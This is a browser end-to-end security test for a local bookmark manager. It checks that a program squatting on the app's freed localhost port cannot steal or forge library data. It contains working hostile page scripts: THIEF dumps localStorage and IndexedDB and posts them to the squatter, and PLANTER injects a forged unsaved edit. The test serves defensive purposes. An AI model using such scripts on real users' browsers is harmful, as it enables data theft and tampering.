// While the app is off its port is free, and any program on this PC can take it. This test is that program: the real
// packaged entry runs in a throwaway profile, a real browser opens it, the app stops, and a stand-in takes its port. Its
// page tries to read what the browser stored, and it tells a tab left open whatever would get the most out of it. Nothing
// of the library may reach it, nothing it says may be believed, and the app must then carry on as if it had never been.
// Windows only. Synthetic links only. SBM_PACKAGED_EXE runs a built program instead of the entry from source.
import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { readFile, mkdir, mkdtemp, rm } from 'node:fs/promises';
import { createServer } from 'node:http';
import { createRequire } from 'node:module';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
const { chromium } = require(process.env.C4_PLAYWRIGHT_MODULE || 'playwright');
const root = fileURLToPath(new URL('../../', import.meta.url));
await mkdir(join(root, '.verify'), { recursive: true });
const profile = await mkdtemp(join(root, '.verify', 'free-port-'));
const python = process.env.C4_PYTHON || 'python';
const built = process.env.SBM_PACKAGED_EXE;
const SECRET = 'Rye loaf only the owner saved';
const EDIT = 'A change made after the app stopped';
const FORGED = 'A link the other program made up';

const env = {};
for (const name of ['SystemRoot', 'WINDIR', 'COMSPEC', 'PATH', 'PATHEXT']) if (process.env[name]) env[name] = process.env[name];
Object.assign(env, { LOCALAPPDATA: profile, APPDATA: profile, USERPROFILE: profile, TEMP: profile, TMP: profile, SBM_TEST_ROOT: root,
  SUPER_BOOKMARK_MANAGER_PORT: '0', PYTHONDONTWRITEBYTECODE: '1', PYTHONUTF8: '1' });
if (built) env.BROWSER = `"${python.replace(/python\.exe$/, 'pythonw.exe')}" -c pass %s`;

const wait = async (what, predicate, timeout = 20000) => {
  const until = Date.now() + timeout;
  for (;;) {
    const value = await predicate().catch(() => undefined);
    if (value) return value;
    if (Date.now() > until) throw new Error(`timed out waiting for ${what}`);
    await new Promise(resolve => setTimeout(resolve, 100));
  }
};

let child;
async function startApp(port) {
  await rm(join(profile, 'SuperBookmarkManager', 'runtime.json'), { force: true });
  child = spawn(built || python, built ? [] : ['-B', join(root, 'packaging', 'tests', 'runtime_wrapper.py')],
    { env: { ...env, SUPER_BOOKMARK_MANAGER_PORT: String(port) }, cwd: profile, stdio: 'ignore', windowsHide: true });
  return wait('the app', async () => JSON.parse(await readFile(join(profile, 'SuperBookmarkManager', 'runtime.json'), 'utf8')), 60000);
}
const stopApp = async ({ port, token }) => {
  const stopped = new Promise(resolve => child.once('exit', resolve));
  await fetch(`http://127.0.0.1:${port}/api/runtime/quit`, { method: 'POST',
    headers: { 'Content-Type': 'application/json', 'X-SBM-Instance': token, Origin: `http://127.0.0.1:${port}` }, body: '{"confirm": true}' });
  await stopped;
};

/** The program that took the port. Its page reads everything the browser keeps for this address and hands it over. */
const THIEF = `<!doctype html><title>Not SuperBookmarks</title><script>
(async () => {
  const stolen = { local: Object.fromEntries(Object.entries(localStorage)), databases: {} };
  for (const { name } of await indexedDB.databases()) {
    const db = await new Promise(resolve => { const r = indexedDB.open(name); r.onsuccess = () => resolve(r.result); });
    for (const store of db.objectStoreNames) {
      const rows = await new Promise(resolve => { const r = db.transaction(store).objectStore(store).getAll(); r.onsuccess = () => resolve(r.result); });
      stolen.databases[name + '/' + store] = rows.map(row => typeof row === 'string' ? row : String.fromCharCode(...new Uint8Array(row.buffer ?? row)));
    }
  }
  const cached = await fetch('/', { cache: 'only-if-cached', mode: 'same-origin' }).then(r => r.text()).catch(() => '');
  await fetch('/stolen', { method: 'POST', body: JSON.stringify({ ...stolen, cached }) });
})();
</script>`;
function takePort(port, proof = 'f'.repeat(64), page = THIEF) {
  const seen = [];
  let stolen;
  const server = createServer((request, response) => {
    let body = '';
    request.on('data', part => { body += part; });
    request.on('end', () => {
      seen.push({ method: request.method, url: request.url, body, instance: request.headers['x-sbm-instance'] });
      if (request.url === '/stolen') { stolen = body; response.end('ok'); return; }
      response.setHeader('Access-Control-Allow-Origin', '*');
      if (request.url.startsWith('/api/runtime/hello')) return response.end(JSON.stringify({ proof }));
      if (request.url.startsWith('/api/library')) {
        response.setHeader('Content-Type', 'application/json');
        return response.end(JSON.stringify({ ok: true, deletedUrls: [], legacyRows: [], rev: 99, posts: [{ id: 'forged', url: 'https://example.test/forged', source: 'manual',
          platform: 'web', domain: 'example.test', title: FORGED, status: 'inbox', createdAt: '2026-10-20T10:00:00.000Z', updatedAt: '2026-10-20T10:00:00.000Z',
          metadataStatus: 'partial', categories: [], categoryMode: 'manual', tags: [], projectIds: [] }] }));
      }
      response.setHeader('Content-Type', 'text/html');
      response.end(page);
    });
  });
  return new Promise(resolve => server.listen(port, '127.0.0.1', () => resolve({ seen, stolen: () => stolen,
    stop: () => new Promise(done => { server.closeAllConnections(); server.close(done); }) })));
}

/** Plants a link of its own in what the browser keeps, as an unsaved edit: the next real page would send it to the app. */
const PLANTER = `<!doctype html><title>Not SuperBookmarks</title><script>
for (const key of Object.keys(localStorage)) {
  if (!key.endsWith('library-store-v1')) continue;
  const post = { id: 'planted', url: 'https://example.test/planted', source: 'manual', platform: 'web', domain: 'example.test', title: '${FORGED}',
    status: 'inbox', createdAt: '2026-10-20T10:00:00.000Z', updatedAt: '2026-10-20T10:00:00.000Z', categories: [], tags: [], projectIds: [] };
  localStorage.setItem(key, JSON.stringify({ state: { posts: [post], pending: { [post.url]: post }, deletedUrls: [] }, version: 6 }));
}
fetch('/stolen', { method: 'POST', body: 'planted' });
</script>`;

const browser = await chromium.launch({ headless: true, channel: process.env.C4_BROWSER_CHANNEL || undefined });
const failures = [];
async function check(name, run) {
  try { await run(); console.log(`PASS ${name}`); } catch (error) { failures.push(name); console.error(`FAIL ${name}: ${error.message}`); }
}

try {
  let info = await startApp(0);
  const base = `http://127.0.0.1:${info.port}`;
  const context = await browser.newContext({ viewport: { width: 1280, height: 800 } });
  const tab = await context.newPage();
  await tab.goto(`${base}/library`);
  const instance = await tab.locator('meta[name="sbm-instance"]').getAttribute('content');
  assert.equal(instance, info.token);
  const now = new Date().toISOString();
  const answer = await tab.evaluate(post => fetch('/api/library', { method: 'POST', headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ posts: [post], deletedUrls: [] }) }).then(r => r.json()),
  { id: 'id-rye', url: 'https://example.test/rye', source: 'manual', platform: 'web', domain: 'example.test', title: SECRET, status: 'inbox',
    createdAt: now, updatedAt: now, metadataStatus: 'partial', categories: [], categoryMode: 'manual', tags: [], projectIds: [] });
  assert.deepEqual(answer.rejected ?? [], [], 'the link is saved');
  await tab.reload();
  await tab.getByText(SECRET).first().waitFor({ timeout: 20000 });
  const stored = () => tab.evaluate(() => Object.values(localStorage).join('\n'));
  await wait('the browser to keep the library', async () => (await stored()).length > 1000 || (await tab.evaluate(async () => (await indexedDB.databases()).length)));

  await check('what the browser keeps shows nothing of the library', async () => {
    assert.ok(!(await stored()).includes(SECRET));
    assert.ok(!(await stored()).includes('example.test/rye'));
  });

  await check('the home page holds the keys only for the app\'s own pages, and the browser keeps no copy of it', async () => {
    const headers = await (await fetch(`${base}/`)).headers;
    assert.equal(headers.get('cache-control'), 'no-store');
  });

  await check('a popup has no way back to the page', async () => {
    // This Save window is the one page that lets its opener keep a handle, as a program's own page would. The page's
    // own header cuts the link all the same: to the page the popup is simply gone.
    const cut = await tab.evaluate(async () => {
      const popup = window.open('/add?url=https%3A%2F%2Fwww.instagram.com%2Fp%2Fabcde%2F');
      for (let i = 0; i < 100 && !popup.closed; i++) await new Promise(resolve => setTimeout(resolve, 100));
      return popup.closed;
    });
    assert.equal(cut, true);
    for (const page of context.pages()) if (page !== tab) await page.close();
  });

  // A change that hasn't reached the app when it stops. It waits in what the browser keeps.
  const before = await stored();
  await tab.route('**/api/library', route => route.abort());
  await tab.getByRole('button', { name: 'Add link' }).first().click();
  const adding = tab.getByRole('dialog', { name: 'Add link' });
  await adding.getByPlaceholder('https://…').fill('https://example.test/after');
  await adding.getByRole('button', { name: 'Save link', exact: true }).click();
  await wait('the change to reach what the browser keeps', async () => await stored() !== before);
  await stopApp(info);
  await tab.unroute('**/api/library');

  const other = await takePort(info.port);

  await check('a tab left open finds out and says so', async () => {
    await tab.getByRole('alertdialog').getByText('Another program is answering at this address').waitFor({ timeout: 25000 });
  });
  await check('it sends that program nothing and believes nothing it says', async () => {
    const sent = other.seen.filter(request => !request.url.startsWith('/api/runtime/hello'));
    assert.deepEqual(sent.filter(request => request.method !== 'GET'), [], 'no write of any kind');
    assert.ok(!JSON.stringify(other.seen).includes(info.token), 'and not this run\'s token');
    assert.ok(!JSON.stringify(other.seen).includes('example.test/after'), 'nor the change');
    assert.equal(await tab.getByText(FORGED).count(), 0);
  });

  const visitor = await context.newPage();
  await visitor.goto(base + '/');
  await wait('the other program\'s page to read what it can', async () => other.stolen());
  await check('a page of that program reads nothing of the library from the browser', async () => {
    const stolen = other.stolen();
    assert.ok(stolen.length > 50, 'it did read the storage');
    assert.ok(!stolen.includes(SECRET));
    assert.ok(!stolen.includes('example.test/rye'));
    assert.ok(!stolen.includes(info.token));
    assert.ok(!stolen.includes('sbm-cache-key') && !stolen.includes('sbm-proof-key'), 'nor the page that holds the keys');
  });
  await visitor.close();
  await tab.close();
  await other.stop();

  info = await startApp(info.port);
  await check('the app comes back to the same address with the library and the waiting change', async () => {
    assert.equal(`http://127.0.0.1:${info.port}`, base);
    const again = await context.newPage();
    await again.goto(`${base}/library`);
    await again.getByText(SECRET).first().waitFor({ timeout: 20000 });
    assert.equal(await again.getByRole('alertdialog').count(), 0);
    assert.equal(await again.getByText(FORGED).count(), 0);
    await wait('the waiting change to reach the app', async () => {
      const library = await (await fetch(`${base}/api/library`)).json();
      return library.posts.some(post => post.url.startsWith('https://example.test/after'));
    });
  });

  await check('no false alarm: a tab left open through a restart finds the app again', async () => {
    const through = await context.newPage();
    await through.goto(`${base}/library`);
    await through.getByText(SECRET).first().waitFor({ timeout: 20000 });
    await through.evaluate(() => { const dialog = document.createElement('dialog'); dialog.id = 'test-dialog'; document.getElementById('root').append(dialog); dialog.showModal(); });
    await stopApp(info);
    const refused = await through.evaluate(() => fetch('/api/stats').then(r => r.status, () => 'no answer'));
    assert.equal(refused, 'no answer', 'with the app off a request stops in the page');
    await through.getByRole('alertdialog').getByText("SuperBookmarks isn't answering").waitFor({ timeout: 10000 });
    assert.equal(await through.locator('#root[inert]').count(), 1, 'nothing behind it can be used');
    assert.equal(await through.locator('dialog[open]').count(), 0, 'not a dialog either: those stay usable in an inert page');
    info = await startApp(info.port);
    await through.getByRole('alertdialog').waitFor({ state: 'detached', timeout: 15000 });
    assert.equal(await through.locator('#root[inert]').count(), 0);
    await through.getByText(SECRET).first().waitFor({ timeout: 15000 });
    // It came back as a page of the new run, so it can write as well as read.
    const wrote = await through.evaluate(() => fetch('/api/library', { method: 'POST', headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ posts: [], deletedUrls: [] }) }).then(r => r.status));
    assert.equal(wrote, 200);
    await through.close();
  });

  await stopApp(info);
  await check('a program that answers the proof with nonsense gets the same as none: nothing, and the tab covered', async () => {
    const holder = await context.newPage();
    await holder.goto('about:blank');
    const nonsense = await takePort(info.port, 'not a proof');
    await holder.goto(`${base}/library`).catch(() => {});
    await nonsense.stop();
    await holder.close();
    info = await startApp(info.port);
    const through = await context.newPage();
    await through.goto(`${base}/library`);
    await through.getByText(SECRET).first().waitFor({ timeout: 20000 });
    await stopApp(info);
    const answering = await takePort(info.port, 'not a proof');
    await through.getByRole('alertdialog').getByText("SuperBookmarks isn't answering").waitFor({ timeout: 15000 });
    assert.deepEqual(answering.seen.filter(request => request.method !== 'GET'), []);
    await through.close();
    await answering.stop();
  });

  await check('a plain copy planted in the browser never reaches the library', async () => {
    const planter = await takePort(info.port, undefined, PLANTER);
    const visit = await context.newPage();
    await visit.goto(base + '/');
    await wait('the planting', async () => planter.stolen());
    await visit.close();
    await planter.stop();
    info = await startApp(info.port);
    const again = await context.newPage();
    await again.goto(`${base}/library`);
    await again.getByText(SECRET).first().waitFor({ timeout: 20000 });
    await new Promise(resolve => setTimeout(resolve, 2500));
    assert.equal(await again.getByText(FORGED).count(), 0, 'not shown');
    const library = await (await fetch(`${base}/api/library`)).json();
    assert.ok(!library.posts.some(post => post.url.includes('planted')), 'and not sent to the app');
    await again.close();
  });
  await stopApp(info);
} catch (error) {
  failures.push(error.message);
  console.error(`FAIL ${error.stack}`);
} finally {
  child?.kill();
  await browser.close();
  await rm(profile, { recursive: true, force: true, maxRetries: 5 }).catch(() => {});
}
if (failures.length) { console.error(`${failures.length} failed`); process.exit(1); }
console.log('free-port-e2e passed');
